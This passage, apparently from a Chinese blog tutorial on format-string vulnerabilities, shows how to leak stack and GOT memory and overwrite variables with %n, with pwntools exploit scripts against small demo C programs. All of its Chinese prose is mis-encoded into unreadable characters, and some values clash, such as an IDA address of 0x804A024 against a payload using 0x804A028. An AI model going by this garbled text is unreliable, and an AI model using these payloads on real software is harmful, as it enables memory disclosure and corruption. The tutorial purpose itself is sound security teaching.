ˆåœ°å€ã€‚</p><p>noteï¼šå¹¶ä¸æ˜¯æ¯æ¬¡å¾—åˆ°çš„ç»“æœéƒ½ä¸€æ · ï¼Œå› ä¸ºæ ˆä¸Šçš„æ•°æ®ä¼šå› ä¸ºæ¯æ¬¡åˆ†é…çš„å†…å­˜é¡µä¸åŒè€Œæœ‰æ‰€ä¸åŒï¼Œè¿™æ˜¯å› ä¸º<strong>æ ˆæ˜¯ä¸å¯¹å†…å­˜é¡µåšåˆå§‹åŒ–</strong>ã€‚</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/6.png"></p><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸Šé¢ç»™å‡ºçš„æ–¹æ³•ï¼Œéƒ½æ˜¯ä¾æ¬¡è·å¾—æ ˆä¸­çš„æ¯ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è·å–æ ˆä¸­è¢«è§†ä¸ºç¬¬ n+1 ä¸ªå‚æ•°çš„å€¼ï¼š<code>%n$x</code></strong> â€“ <font color="red">né’ˆå¯¹çš„æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°</font></p><ul><li><strong>æ³¨æ„åŒºåˆ«<font color="red">æ ¼å¼åŒ–å­—ç¬¦ä¸²</font>çš„å‚æ•°ä¸<font color="red">æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°</font>çš„å‚æ•°</strong></li></ul><p>å¦‚è¾“å…¥<code>%6$p</code></p><ul><li>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ‰“å°å‡ºäº†printfçš„ç¬¬7ä¸ªå‚æ•°ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬6ä¸ªå‚æ•°</li></ul><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/7.png"></p><h6 id="è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²"><a href="#è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²" class="headerlink" title="è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²"></a>è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²</h6><p>åˆ©ç”¨<code>%s</code>å¯ä»¥è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸² ï¼Œ<strong>ä½†æ˜¯ï¼Œä¸æ˜¯æ‰€æœ‰<code>%s</code>éƒ½ä¼šæ­£å¸¸è¿è¡Œï¼Œå¦‚æœå¯¹åº”çš„å˜é‡ä¸èƒ½å¤Ÿè¢«è§£æä¸ºå­—ç¬¦ä¸²åœ°å€ï¼Œé‚£ä¹ˆï¼Œç¨‹åºå°±ä¼šç›´æ¥å´©æºƒã€‚</strong></p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/8.png"></p><p>å°æ€»ç»“ï¼š</p><ol><li>åˆ©ç”¨ %x æ¥è·å–å¯¹åº”æ ˆçš„å†…å­˜ï¼Œä½†å»ºè®®ä½¿ç”¨ %pï¼Œå¯ä»¥ä¸ç”¨è€ƒè™‘ä½æ•°çš„åŒºåˆ«ã€‚</li><li>åˆ©ç”¨ %s æ¥è·å–å˜é‡æ‰€å¯¹åº”åœ°å€çš„å†…å®¹ï¼Œåªä¸è¿‡æœ‰é›¶æˆªæ–­ã€‚</li><li>åˆ©ç”¨ %order$x æ¥è·å–æŒ‡å®šå‚æ•°çš„å€¼ï¼Œåˆ©ç”¨ %order$s æ¥è·å–æŒ‡å®šå‚æ•°å¯¹åº”åœ°å€çš„å†…å®¹ã€‚</li></ol><h5 id="æ³„æ¼ä»»æ„åœ°å€å†…å­˜"><a href="#æ³„æ¼ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="æ³„æ¼ä»»æ„åœ°å€å†…å­˜"></a>æ³„æ¼ä»»æ„åœ°å€å†…å­˜</h5><p>ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸­ï¼Œæˆ‘ä»¬æ‰€è¯»å–çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²éƒ½æ˜¯åœ¨æ ˆä¸Šçš„ï¼ˆå› ä¸ºæ˜¯æŸä¸ªå‡½æ•°çš„å±€éƒ¨å˜é‡ï¼‰ã€‚é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨è°ƒç”¨è¾“å‡ºå‡½æ•°çš„æ—¶å€™ï¼Œå…¶å®ï¼Œ<strong>ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼å…¶å®å°±æ˜¯è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€ã€‚</strong></p><p>å¯ä»¥çœ‹å‡ºåœ¨æ ˆä¸Šçš„ç¬¬äºŒä¸ªå˜é‡å°±æ˜¯æˆ‘ä»¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€ 0xffffcfe0ï¼ŒåŒæ—¶è¯¥åœ°å€å­˜å‚¨çš„ä¹Ÿç¡®å®æ˜¯<code>'%s'</code>æ ¼å¼åŒ–å­—ç¬¦ä¸²å†…å®¹ã€‚</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/9.png"></p><p>é‚£ä¹ˆç”±äºæˆ‘ä»¬å¯ä»¥æ§åˆ¶è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“è¯¥<strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨è¾“å‡ºå‡½æ•°è°ƒç”¨æ—¶æ˜¯ç¬¬å‡ ä¸ªå‚æ•°</strong>ï¼Œè¿™é‡Œå‡è®¾è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›¸å¯¹å‡½æ•°è°ƒç”¨ä¸ºç¬¬ k ä¸ªå‚æ•°ã€‚é‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¦‚ä¸‹çš„æ–¹å¼æ¥è·å–æŸä¸ªæŒ‡å®šåœ°å€ addr çš„å†…å®¹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">addr<span class="token operator">%</span>k$s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>æ³¨ï¼š åœ¨è¿™é‡Œï¼Œå¦‚æœæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¸€å®šç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç›¸å¯¹åç§»ï¼Œè¿™æ˜¯å› ä¸ºåœ¨å‡½æ•°è°ƒç”¨çš„æ—¶å€™æ ˆæŒ‡é’ˆè‡³å°‘ä½äºæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€ 8 å­—èŠ‚æˆ–è€… 16 å­—èŠ‚ã€‚</p></blockquote><p>ä¸‹é¢å°±æ˜¯å¦‚ä½•ç¡®å®šè¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸ºç¬¬å‡ ä¸ªå‚æ•°çš„é—®é¢˜äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼ç¡®å®š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">[</span>tag<span class="token punctuation">]</span><span class="token operator">%</span>p<span class="token operator">%</span>p<span class="token operator">%</span>p<span class="token operator">%</span>p<span class="token operator">%</span>p<span class="token operator">%</span>p<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬ä¼š<strong>é‡å¤æŸä¸ªå­—ç¬¦çš„æœºå™¨å­—é•¿æ¥ä½œä¸º tagï¼Œè€Œåé¢ä¼šè·Ÿä¸Šè‹¥å¹²ä¸ª %p</strong> æ¥è¾“å‡ºæ ˆä¸Šçš„å†…å®¹ï¼Œå¦‚æœ<strong>å†…å®¹ä¸æˆ‘ä»¬å‰é¢çš„ tag é‡å¤äº†</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æœ‰å¾ˆå¤§æŠŠæ¡è¯´æ˜è¯¥åœ°å€å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€ï¼Œä¹‹æ‰€ä»¥è¯´æ˜¯æœ‰å¾ˆå¤§æŠŠæ¡ï¼Œè¿™æ˜¯å› ä¸ºä¸æ’é™¤æ ˆä¸Šæœ‰ä¸€äº›ä¸´æ—¶å˜é‡ä¹Ÿæ˜¯è¯¥æ•°å€¼ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæå…¶å°‘è§ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ›´æ¢å…¶ä»–å­—ç¬¦è¿›è¡Œå°è¯•ï¼Œè¿›è¡Œå†æ¬¡ç¡®è®¤ã€‚è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨å­—ç¬¦â€™Aâ€™ä½œä¸ºç‰¹å®šå­—ç¬¦ï¼ŒåŒæ—¶è¿˜æ˜¯åˆ©ç”¨ä¹‹å‰ç¼–è¯‘å¥½çš„ç¨‹åºï¼Œåªæ˜¯åŠ äº†ä¸ª<code>puts</code>å‡½æ•°å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"hello world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥å‘ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬10ä¸ªå‚æ•°</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/10.png"></p><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./leak"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./leak"</span><span class="token punctuation">)</span><span class="token comment">#gdb.attach(io, 'b main')</span><span class="token comment">#pause()</span><span class="token comment">#context.log_level = 'debug'</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%10$s'</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'%10$s\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆåŠŸæ³„æ¼<code>puts</code>å‡½æ•°åœ°å€</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/11.png"></p><h4 id="è¦†ç›–å†…å­˜"><a href="#è¦†ç›–å†…å­˜" class="headerlink" title="è¦†ç›–å†…å­˜"></a>è¦†ç›–å†…å­˜</h4><p>åªè¦å˜é‡å¯¹åº”çš„åœ°å€å¯å†™ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥ä¿®æ”¹å…¶å¯¹åº”çš„æ•°å€¼ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">%</span>n<span class="token punctuation">,</span>ä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æµ‹è¯•ç¨‹åºæ¥è‡ªwikiï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">789</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åŠ äº†ä¸€å¥</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified c."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified a for a small number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0x12345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified b for a big number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ— è®ºæ˜¯è¦†ç›–å“ªä¸ªåœ°å€çš„å˜é‡ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šéƒ½æ˜¯æ„é€ ç±»ä¼¼å¦‚ä¸‹çš„ payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">...[overwrite addr]....%[overwrite offset]$n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…¶ä¸­â€¦ è¡¨ç¤ºæˆ‘ä»¬çš„å¡«å……å†…å®¹ï¼Œoverwrite addr è¡¨ç¤ºæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€ï¼Œoverwrite offset åœ°å€è¡¨ç¤ºæˆ‘ä»¬æ‰€<strong>è¦è¦†ç›–çš„åœ°å€å­˜å‚¨çš„ä½ç½®ä¸ºè¾“å‡ºå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å‡ ä¸ªå‚æ•°</strong>ã€‚æ‰€ä»¥ä¸€èˆ¬æ¥è¯´ï¼Œä¹Ÿæ˜¯å¦‚ä¸‹æ­¥éª¤</p><ul><li>ç¡®å®šè¦†ç›–åœ°å€</li><li>ç¡®å®šç›¸å¯¹åç§»</li><li>è¿›è¡Œè¦†ç›–</li></ul><h5 id="è¦†ç›–æ ˆå†…å­˜"><a href="#è¦†ç›–æ ˆå†…å­˜" class="headerlink" title="è¦†ç›–æ ˆå†…å­˜"></a>è¦†ç›–æ ˆå†…å­˜</h5><ul><li><p>ç¡®å®šè¦†ç›–åœ°å€ï¼šé¦–å…ˆï¼Œæˆ‘ä»¬è‡ªç„¶æ˜¯æ¥æƒ³åŠæ³•çŸ¥é“æ ˆå˜é‡ c çš„åœ°å€ã€‚ç”±äºç›®å‰å‡ ä¹ä¸Šæ‰€æœ‰çš„ç¨‹åºéƒ½å¼€å¯äº† aslr ä¿æŠ¤ï¼Œæ‰€ä»¥æ ˆçš„åœ°å€ä¸€ç›´åœ¨å˜ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œæ•…æ„è¾“<strong>å‡ºäº† c å˜é‡çš„åœ°å€ã€‚</strong></p></li><li><p>ç¡®å®šç›¸å¯¹åç§»ï¼šå…¶æ¬¡ï¼Œæˆ‘ä»¬æ¥ç¡®å®šä¸€ä¸‹<strong>å­˜å‚¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€æ˜¯ printf å°†è¦è¾“å‡ºçš„ç¬¬å‡ ä¸ªå‚æ•° ()ã€‚</strong> è¿™é‡Œæˆ‘ä»¬é€šè¿‡ä¹‹å‰çš„æ³„éœ²æ ˆå˜é‡æ•°å€¼çš„æ–¹æ³•æ¥è¿›è¡Œæ“ä½œã€‚é€šè¿‡è°ƒè¯•ï¼š</p></li></ul><p>å¯ä»¥å‘ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€ä¸º0xffffcfff8ï¼Œåˆ™(0xffffcfff8 - 0xffffcfe0) // 4 = 6ï¼Œæ‰€æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬6ä¸ªå‚æ•°ï¼Œä¸ºprintfçš„ç¬¬7ä¸ªå‚æ•°</p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/12.png"></p><ul><li>è¿›è¡Œè¦†ç›–</li></ul><p>è¿™æ ·ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨ %n çš„ç‰¹å¾æ¥ä¿®æ”¹ c çš„å€¼ã€‚payload å¦‚ä¸‹ï¼š</p><p>addr of c çš„é•¿åº¦ä¸º 4ï¼Œæ•…è€Œæˆ‘ä»¬å¾—å†è¾“å…¥ 12 ä¸ªå­—ç¬¦æ‰å¯ä»¥è¾¾åˆ° 16 ä¸ªå­—ç¬¦ï¼Œä»¥ä¾¿äºæ¥ä¿®æ”¹ c çš„å€¼ä¸º 16ã€‚%6$næ˜¯æŠŠä¹‹å‰è¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬6ä¸ªå‚æ•°ã€‚</p><pre class="line-numbers language-none"><code class="language-none">[addr of c]%012d%6$n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./overflow"</span><span class="token punctuation">)</span>c_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%12d%6$n'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    c<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆåŠŸè¾“å‡º modified c. </p><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/13.png"></p><h5 id="è¦†ç›–ä»»æ„åœ°å€å†…å­˜"><a href="#è¦†ç›–ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="è¦†ç›–ä»»æ„åœ°å€å†…å­˜"></a>è¦†ç›–ä»»æ„åœ°å€å†…å­˜</h5><h6 id="è¦†ç›–å°æ•°å­—"><a href="#è¦†ç›–å°æ•°å­—" class="headerlink" title="è¦†ç›–å°æ•°å­—"></a>è¦†ç›–å°æ•°å­—</h6><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥è€ƒè™‘ä¸€ä¸‹å¦‚ä½•ä¿®æ”¹ data æ®µçš„å˜é‡ä¸ºä¸€ä¸ªè¾ƒå°çš„æ•°å­—ï¼Œæ¯”å¦‚è¯´ï¼Œ<strong>å°äºæœºå™¨å­—é•¿çš„æ•°å­—</strong>ã€‚è¿™é‡Œä»¥ 2 ä¸ºä¾‹ã€‚å¦‚æœæˆ‘ä»¬è¿˜æ˜¯å°†<strong>è¦è¦†ç›–çš„åœ°å€æ”¾åœ¨æœ€å‰é¢ï¼Œé‚£ä¹ˆå°†ç›´æ¥å ç”¨æœºå™¨å­—é•¿ä¸ª (4 æˆ– 8) å­—èŠ‚ã€‚æ˜¾ç„¶ï¼Œæ— è®ºä¹‹åå¦‚ä½•è¾“å‡ºï¼Œéƒ½åªä¼šæ¯” 4 å¤§ã€‚</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿå…¶å®æ²¡å¿…è¦å°†æ‰€è¦è¦†ç›–çš„å˜é‡çš„åœ°å€æ”¾åœ¨å­—ç¬¦ä¸²çš„æœ€å‰ï¼Œæˆ‘ä»¬å½“æ—¶åªæ˜¯ä¸ºäº†å¯»æ‰¾åç§»ï¼Œæ‰€ä»¥æ‰æŠŠ tag æ”¾åœ¨å­—ç¬¦ä¸²çš„æœ€å‰é¢ï¼Œå¦‚æœæˆ‘ä»¬æŠŠ tag æ”¾åœ¨ä¸­é—´ï¼Œå…¶å®ä¹Ÿæ˜¯æ— å¦¨çš„ã€‚ç±»ä¼¼çš„ï¼Œæˆ‘ä»¬æŠŠåœ°å€æ”¾åœ¨ä¸­é—´ï¼Œåªè¦èƒ½å¤Ÿæ‰¾åˆ°å¯¹åº”çš„åç§»ï¼Œå…¶ç…§æ ·ä¹Ÿå¯ä»¥å¾—åˆ°å¯¹åº”çš„æ•°å€¼ã€‚å‰é¢å·²ç»è¯´äº†æˆ‘ä»¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä¸ºç¬¬ 6 ä¸ªå‚æ•°ã€‚ç”±äºæˆ‘ä»¬æƒ³è¦æŠŠ 2 å†™åˆ°å¯¹åº”çš„åœ°å€å¤„ï¼Œæ•…è€Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‰é¢çš„å­—èŠ‚å¿…é¡»æ˜¯ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">aa<span class="token operator">%</span>k$nxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­¤æ—¶å¯¹åº”çš„å­˜å‚¨çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å·²ç»å æ®äº† 6 ä¸ªå­—ç¬¦çš„ä½ç½®ï¼Œå¦‚æœæˆ‘ä»¬å†æ·»åŠ ä¸¤ä¸ªå­—ç¬¦ aaï¼Œé‚£ä¹ˆ<strong>å…¶å® aa%k å°±æ˜¯ç¬¬ 6 ä¸ªå‚æ•°ï¼Œ$nxx å…¶å®å°±æ˜¯ç¬¬ 7 ä¸ªå‚æ•°</strong>ï¼Œåé¢æˆ‘ä»¬<strong>å¦‚æœè·Ÿä¸Šæˆ‘ä»¬è¦è¦†ç›–çš„åœ°å€ï¼Œé‚£å°±æ˜¯ç¬¬ 8 ä¸ªå‚æ•°ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¿™é‡Œè®¾ç½® k ä¸º 8</strong>ï¼Œå…¶å®å°±å¯ä»¥è¦†ç›–äº†ã€‚</p><ul><li>ç¡®å®šè¦†ç›–åœ°å€ï¼šaæ˜¯åˆå§‹åŒ–çš„å…¨å±€å˜é‡ï¼Œåœ¨bssæ®µä¸­ï¼Œç›´æ¥åœ¨IDAé‡Œé¢æ‰¾ï¼š0x804A024</li></ul><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/14.png"></p><ul><li>ç¡®å®šç›¸å¯¹åç§»</li></ul><p>æ ¹æ®ä¸Šé¢åˆ†æï¼Œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¬8ä¸ªå‚æ•°</p><ul><li>è¿›è¡Œè¦†ç›–</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token char">'aa%8$naa'</span> <span class="token operator">+</span> <span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0x804A028</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./overflow"</span><span class="token punctuation">)</span>c_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%12d%6$n'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> <span class="token string">'aa%8$naa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804A028</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>a<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img 